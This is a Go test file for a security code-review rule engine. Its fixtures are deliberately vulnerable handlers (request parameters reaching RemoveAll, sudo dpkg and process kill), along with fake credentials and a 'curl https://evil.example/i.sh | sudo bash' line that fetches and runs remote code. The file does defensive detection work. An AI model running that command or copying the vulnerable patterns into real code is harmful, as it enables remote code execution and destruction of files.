package review

import (
	"strings"
	"testing"
)

func goDiff(file, source string) string {
	var b strings.Builder
	b.WriteString("diff --git a/" + file + " b/" + file + "\n--- a/" + file + "\n+++ b/" + file + "\n")
	b.WriteString("@@ -0,0 +1," + itoa(strings.Count(source, "\n")+1) + " @@\n")
	for _, line := range strings.Split(strings.TrimSuffix(source, "\n"), "\n") {
		b.WriteString("+" + line + "\n")
	}
	return b.String()
}

// Modeled on M3tal-core api/plugins.go: chi param -> filepath.Join -> RemoveAll.
func TestTaintRuleCatchesChiParamFilesystemTraversal(t *testing.T) {
	src := `package api

import (
	"net/http"
	"os"
	"path/filepath"

	"github.com/go-chi/chi/v5"
)

func UninstallPlugin(w http.ResponseWriter, r *http.Request) {
	name := chi.URLParam(r, "name")
	home, _ := os.UserHomeDir()
	userPluginDir := filepath.Join(home, ".config", "m3tal", "plugins", name)
	if err := os.RemoveAll(userPluginDir); err != nil {
		http.Error(w, err.Error(), 500)
	}
}
`
	findings := (TaintRule{}).Check(goDiff("api/plugins.go", src))
	var taint []Finding
	for _, f := range findings {
		if f.Rule == "request-taint" {
			taint = append(taint, f)
		}
	}
	if len(taint) == 0 {
		t.Fatalf("expected request-taint finding, got %+v", findings)
	}
	if taint[0].Severity != "high" {
		t.Fatalf("severity = %s; want high", taint[0].Severity)
	}
}

// Modeled on M3tal-core InstallPlugin: JSON body -> findPluginDeb -> sudo dpkg.
func TestTaintRuleCatchesBodyToExecChain(t *testing.T) {
	src := `package api

import (
	"encoding/json"
	"net/http"
	"os/exec"
)

type InstallRequest struct {
	Package string ` + "`json:\"package\"`" + `
	Mode    string ` + "`json:\"mode\"`" + `
}

func InstallPlugin(w http.ResponseWriter, r *http.Request) {
	var req InstallRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		return
	}
	target := req.Package
	debPath, _ := findPluginDeb(target)
	cmd := exec.Command("sudo", "dpkg", "-i", debPath)
	_ = cmd.Run()
}
`
	findings := (TaintRule{}).Check(goDiff("api/plugins.go", src))
	var taint []Finding
	for _, f := range findings {
		if f.Rule == "request-taint" && f.Severity == "high" {
			taint = append(taint, f)
		}
	}
	if len(taint) == 0 {
		t.Fatalf("expected request-taint finding for exec sink, got %+v", findings)
	}
}

func TestTaintRuleIgnoresUnrelatedSinks(t *testing.T) {
	src := `package api

import (
	"net/http"
	"os"

	"github.com/go-chi/chi/v5"
)

func Handler(w http.ResponseWriter, r *http.Request) {
	name := chi.URLParam(r, "name")
	_ = name
	if err := os.RemoveAll("/var/lib/fixed-plugin-dir"); err != nil {
		return
	}
}
`
	for _, f := range (TaintRule{}).Check(goDiff("api/plugins.go", src)) {
		if f.Rule == "request-taint" {
			t.Fatalf("unexpected taint finding on literal path: %+v", f)
		}
	}
}

func TestTaintRuleIgnoresTaintedContentToFixedPath(t *testing.T) {
	src := `package api

import (
	"encoding/json"
	"net/http"
	"os"
)

func SaveSettings(w http.ResponseWriter, r *http.Request) {
	var req map[string]any
	_ = json.NewDecoder(r.Body).Decode(&req)
	data, _ := json.Marshal(req)
	if err := os.WriteFile("/etc/m3tal/settings.json", data, 0644); err != nil {
		return
	}
}
`
	for _, f := range (TaintRule{}).Check(goDiff("api/settings.go", src)) {
		if f.Rule == "request-taint" {
			t.Fatalf("request-controlled content to fixed path flagged: %+v", f)
		}
	}
}

func TestWildcardDefaultScopeCatchesStarFallback(t *testing.T) {
	src := `package state

func NormalizePermissions(scopes []string) []string {
	out := make([]string, 0, len(scopes))
	for _, s := range scopes {
		if validScope(s) {
			out = append(out, s)
		}
	}
	if len(out) == 0 {
		return []string{"*"}
	}
	return out
}
`
	findings := (ScopeDefaultRule{}).Check(goDiff("core/state/permissions.go", src))
	if len(findings) != 1 || findings[0].Rule != "wildcard-default-scope" || findings[0].Severity != "high" {
		t.Fatalf("findings = %+v; want one high wildcard-default-scope", findings)
	}
}

func TestWildcardDefaultScopeIgnoresRejectingNormalizer(t *testing.T) {
	src := `package state

func NormalizePermissions(scopes []string) ([]string, error) {
	out := make([]string, 0, len(scopes))
	for _, s := range scopes {
		if !validScope(s) {
			return nil, ErrInvalidScope
		}
		out = append(out, s)
	}
	return out, nil
}
`
	for _, f := range (ScopeDefaultRule{}).Check(goDiff("core/state/permissions.go", src)) {
		if f.Rule == "wildcard-default-scope" {
			t.Fatalf("unexpected wildcard-default-scope: %+v", f)
		}
	}
}

func TestPluginTrustCatchesAutoStartAndEnvCreds(t *testing.T) {
	src := `package plugins

import (
	"os/exec"
	"path/filepath"
)

type PluginSpec struct {
	Command string
}

func (m *Manager) DiscoverAndAutoStart() {
	for _, dir := range []string{"./plugins", filepath.Join(m.home, "plugins")} {
		_ = dir
	}
	spec := loadSpec()
	cmd := exec.Command(spec.Command)
	cmd.Env = append(os.Environ(), "M3TAL_API_KEY="+resolveCoreAPIKey(), "M3TAL_API_TOKEN="+resolveCoreAPIKey())
	_ = cmd.Start()
}
`
	findings := (PluginTrustRule{}).Check(goDiff("pkg/plugins/host.go", src))
	var autoStart, envCred, cwdPath bool
	for _, f := range findings {
		if f.Rule != "plugin-trust" {
			continue
		}
		switch {
		case strings.Contains(f.Message, "auto-start"):
			autoStart = true
		case strings.Contains(f.Message, "Credential-bearing"):
			envCred = true
		case strings.Contains(f.Message, "working-directory-relative"):
			cwdPath = true
		}
	}
	if !autoStart || !envCred || !cwdPath {
		t.Fatalf("missing plugin-trust findings: autoStart=%v envCred=%v cwdPath=%v all=%+v", autoStart, envCred, cwdPath, findings)
	}
}

func TestPrivilegedExecCatchesSudoDpkgInHandler(t *testing.T) {
	src := `package api

import (
	"net/http"
	"os/exec"

	"github.com/go-chi/chi/v5"
)

func InstallPlugin(w http.ResponseWriter, r *http.Request) {
	debPath := findDeb(chi.URLParam(r, "pkg"))
	cmd := exec.Command("sudo", "dpkg", "-i", debPath)
	_ = cmd.Run()
}
`
	findings := (PrivilegedExecRule{}).Check(goDiff("api/plugins.go", src))
	if len(findings) != 1 || findings[0].Severity != "high" {
		t.Fatalf("findings = %+v; want one high privileged-pkg-exec", findings)
	}
}

func TestPrivilegedExecSkipsNonHTTPFiles(t *testing.T) {
	src := `package main

import "os/exec"

func main() {
	cmd := exec.Command("sudo", "dpkg", "-i", "/fixed/path.deb")
	_ = cmd.Run()
}
`
	for _, f := range (PrivilegedExecRule{}).Check(goDiff("cmd/tool/main.go", src)) {
		if f.Rule == "privileged-pkg-exec" {
			t.Fatalf("unexpected privileged-pkg-exec outside HTTP code: %+v", f)
		}
	}
}

func TestProcessKillCatchesRequestPID(t *testing.T) {
	src := `package api

import (
	"net/http"
	"strconv"

	"github.com/go-chi/chi/v5"
)

func KillProcess(w http.ResponseWriter, r *http.Request) {
	pid, _ := strconv.Atoi(chi.URLParam(r, "pid"))
	proc, _ := findProcess(pid)
	_ = proc.Kill()
}
`
	findings := (ProcessKillRule{}).Check(goDiff("api/handlers.go", src))
	if len(findings) != 1 || findings[0].Rule != "process-kill-abuse" {
		t.Fatalf("findings = %+v; want one process-kill-abuse", findings)
	}
}

func TestCredentialQueryCatchesTokenParam(t *testing.T) {
	src := `package api

import "net/http"

func Handler(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	_ = token
}
`
	findings := (CredentialQueryRule{}).Check(goDiff("api/auth.go", src))
	if len(findings) != 1 || findings[0].Severity != "low" {
		t.Fatalf("findings = %+v; want one low credential-in-query", findings)
	}
}

// ---- Phase 1 false-positive regressions ----

func TestPipeToShellIgnoresCommentsAndDocs(t *testing.T) {
	sh := `#!/bin/bash
# Usage: curl -fsSL https://example.com/install.sh | sudo bash
echo "installing"
`
	for _, f := range ExtraRules("") {
		if f.Name() != "pipe-to-shell" {
			continue
		}
		for _, got := range f.Check(goDiff("install.sh", sh)) {
			t.Fatalf("comment line flagged: %+v", got)
		}
	}
	md := "# Install\n\n```sh\ncurl -fsSL https://example.com/i.sh | sudo bash\n```\n"
	for _, f := range ExtraRules("") {
		if f.Name() != "pipe-to-shell" {
			continue
		}
		for _, got := range f.Check(goDiff("README.md", md)) {
			t.Fatalf("docs flagged: %+v", got)
		}
	}
	// Real pipe in executable position still flags.
	real := "#!/bin/bash\ncurl -fsSL https://evil.example/i.sh | sudo bash\n"
	var flagged bool
	for _, f := range ExtraRules("") {
		if f.Name() == "pipe-to-shell" {
			flagged = len(f.Check(goDiff("install.sh", real))) > 0
		}
	}
	if !flagged {
		t.Fatal("real curl|bash pipe not flagged")
	}
}

func TestSecretMaterialIgnoresTemplatedCISecrets(t *testing.T) {
	yml := `jobs:
  push:
    steps:
      - run: git remote set-url origin https://x-access-token:${{ secrets.API_PUSH_TOKEN }}@github.com/org/repo.git
`
	for _, f := range ExtraRules("") {
		if f.Name() != "secret-material" {
			continue
		}
		for _, got := range f.Check(goDiff(".github/workflows/push.yml", yml)) {
			t.Fatalf("templated CI secret flagged as critical: %+v", got)
		}
	}
	// Literal credential URL still flags.
	lit := "url := \"https://user:Sup3rSecretP@ssw0rd@example.com/x\"\n"
	var flagged bool
	for _, f := range ExtraRules("") {
		if f.Name() == "secret-material" {
			flagged = len(f.Check(goDiff("config.go", lit))) > 0
		}
	}
	if !flagged {
		t.Fatal("literal credential URL not flagged")
	}
}

func TestHardcodedCredentialIgnoresMemberAccessAndLockfiles(t *testing.T) {
	jsx := `export function KeyRow({ apiKey }) {
  const [isRevealed, setRevealed] = useState(false);
  return <span>{isRevealed ? apiKey.token : '•••'}</span>;
}
`
	for _, f := range []Rule{SecurityRule{}} {
		for _, got := range f.Check(goDiff("src/Settings.jsx", jsx)) {
			if got.Rule == "hardcoded-credential" {
				t.Fatalf("member access flagged: %+v", got)
			}
		}
	}
	lock := `{
  "node_modules/js-tokens": {
    "version": "4.0.0",
    "resolved": "https://registry.npmjs.org/js-tokens/-/js-tokens-4.0.0.tgz"
  }
}
`
	for _, got := range (SecurityRule{}).Check(goDiff("package-lock.json", lock)) {
		if got.Rule == "hardcoded-credential" {
			t.Fatalf("lockfile package name flagged: %+v", got)
		}
	}
	// Real literal still flags.
	real := `const config = { api_key: "sk-live-abc123def456ghi789" };
`
	var flagged bool
	for _, got := range (SecurityRule{}).Check(goDiff("src/config.js", real)) {
		if got.Rule == "hardcoded-credential" {
			flagged = true
		}
	}
	if !flagged {
		t.Fatal("literal api_key not flagged")
	}
}

func TestEntropyRuleSkipsGeneratedFiles(t *testing.T) {
	gosum := `github.com/foo/bar v1.2.3 h1:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08=
github.com/foo/bar v1.2.3/go.mod h1:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08=
`
	for _, got := range (EntropyRule{}).Check(goDiff("go.sum", gosum)) {
		if got.Rule == "high-entropy-secret" {
			t.Fatalf("go.sum hash flagged: %+v", got)
		}
	}
}

func TestDebugLeftoverSkipsToolingDirs(t *testing.T) {
	ci := `export function run() {
  console.log("running step");
}
`
	for _, got := range (DebugRule{}).Check(goDiff(".github/scripts/deploy.js", ci)) {
		if got.Rule == "debug-leftover" {
			t.Fatalf("CI script console.log flagged: %+v", got)
		}
	}
	app := `export function run() {
  console.log("debug");
}
`
	var flagged bool
	for _, got := range (DebugRule{}).Check(goDiff("src/app.js", app)) {
		if got.Rule == "debug-leftover" {
			flagged = true
		}
	}
	if !flagged {
		t.Fatal("app console.log not flagged")
	}
}

func TestChiMissingRecoveryAcceptsCustomRecoverer(t *testing.T) {
	src := `package api

import (
	"net/http"

	"github.com/go-chi/chi/v5"
)

func NewRouter() chi.Router {
	r := chi.NewRouter()
	r.Use(apiMiddleware.Recoverer)
	return r
}
`
	for _, pack := range []FrameworkPack{ChiPack("")} {
		for _, rule := range pack.Rules {
			if rule.Name() != "chi-missing-recovery" {
				continue
			}
			for _, got := range rule.Check(goDiff("api/server.go", src)) {
				t.Fatalf("custom Recoverer flagged: %+v", got)
			}
		}
	}
	// Bare router without any recoverer still flags.
	bare := `package api

import "github.com/go-chi/chi/v5"

func NewRouter() chi.Router {
	return chi.NewRouter()
}
`
	var flagged bool
	for _, pack := range []FrameworkPack{ChiPack("")} {
		for _, rule := range pack.Rules {
			if rule.Name() == "chi-missing-recovery" && len(rule.Check(goDiff("api/server.go", bare))) > 0 {
				flagged = true
			}
		}
	}
	if !flagged {
		t.Fatal("bare chi.NewRouter without Recoverer not flagged")
	}
}

func TestPlaintextSecretStorageCatchesTokenColumn(t *testing.T) {
	sql := `CREATE TABLE IF NOT EXISTS api_keys (
    id INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    token TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
`
	var found bool
	for _, f := range ExtraRules("") {
		if f.Name() == "plaintext-secret-storage" && len(f.Check(goDiff("core/state/db.go", sql))) > 0 {
			found = true
		}
	}
	if !found {
		t.Fatal("api_keys token TEXT column not flagged")
	}
}
